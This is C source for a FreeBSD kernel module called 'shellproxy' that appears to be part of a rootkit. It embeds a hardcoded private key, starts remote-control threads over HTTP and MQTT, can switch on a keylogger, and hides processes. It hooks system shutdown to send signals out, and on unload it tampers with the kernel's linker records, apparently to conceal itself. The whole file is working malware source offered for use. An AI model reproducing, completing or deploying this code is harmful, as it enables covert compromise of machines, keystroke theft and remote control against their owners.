#include "config.h"
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/malloc.h>
#include <sys/proc.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include <sys/uio.h>
#include <sys/callout.h>
#include <sys/counter.h>
#include <sys/libkern.h>
#include <sys/devctl.h>
#include <sys/sysctl.h>
#include <sys/kthread.h>
#include <sys/endian.h>

#include <sys/linker.h>
#include <vm/vm.h>
#include <vm/pmap.h>
#include <vm/vm_param.h>
#include <vm/vm_extern.h>
#include <vm/vm_map.h>
#include <vm/vm_kern.h>
#include <vm/vm_object.h>
#include <net/vnet.h>
#include <netinet/in.h>

#include "shellproxy.h"
#include "ehook.h"
#include "keylog.h"

#if defined(__has_include)
# if __has_include("dd_conf.h")
#  include "dd_conf.h"
# endif
#endif

u8 KIT_PRIV[32];

#ifndef KIT_PRIV_HEX
#define KIT_PRIV_HEX "286e0fdf5fbf2a3d6c730368865516b2e14243a66a66511f8a64283dc7514a17"
#endif

// alright honestly this is a backup thing please dont use this dogshit
static
void load_kit_priv (void)
{
	for (int i = 0; i<32; i++) {
		char hex[3];
		hex[0] = KIT_PRIV_HEX[i*2];
		hex[1] = KIT_PRIV_HEX[i*2+1];
		hex[2] = '\0';
		KIT_PRIV[i] = (u8)strtoul(hex, NULL, 16);
	}
}

struct mtx proxy_mtx;
int shutting_down;
int mfire;
int kthreads_started;
int kthreads_done;
time_t keylog_until;

static linker_file_t lfclone = NULL;

static
int findpred (linker_file_t lf, void* arg)
{
	linker_file_t* out = arg;
	vmoffset me = (vmoffset)&findpred;
	if (me >= (vmoffset)lf->address && me < (vmoffset)lf->address+lf->size) {
		*out = lf;
		return (1);
	}
	return (0);
}

static
void shutdown_signal (void* arg)
{
	uint64_t b = (uint64_t)time_second/20;
	(void)proxy_http_any('r', b, NULL);
	(void)proxy_http_any('r', b+1, NULL);
	(void)proxy_http_any('r', b+2, NULL);
	(void)proxy_http_any('r', b+3, NULL);
}

static
int shellproxy_load (struct module * m, int cmd, void* arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		linker_file_foreach(findpred, &lfclone);
		load_kit_priv();
		mtx_init(&proxy_mtx, "shellproxy", NULL, MTX_DEF);
		mfire = 0;
		shutting_down = 0;
		kthreads_started = 0;
		kthreads_done = 0;
		if (dd_start()==0)
			kthreads_started++;
		if (mqtt_start()==0)
			kthreads_started++;
		#ifdef CFG_KEYLOGGER
		keylog_start();
		#endif
		proxy_forkhide_on();
		ehook_on_arg("shutdown_pre_sync", shutdown_signal, NULL, SHUTDOWN_PRI_FIRST);
#ifdef DBGMODEDONTUSEME
		printf("shellproxy: loaded\n");
#endif
		break;
	case MOD_UNLOAD:
		if (lfclone!=NULL) {
			struct ef_mirror* ef = (struct ef_mirror*)lfclone;
			ef->object = NULL;
			lfclone = NULL;
		}
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}
	return (error);
}

int payload_init (void)
{
	return (shellproxy_load(NULL, MOD_LOAD, NULL));
}

static moduledata_t shellproxy_mod = { "shellproxy", shellproxy_load, NULL };

DECLARE_MODULE(shellproxy, shellproxy_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
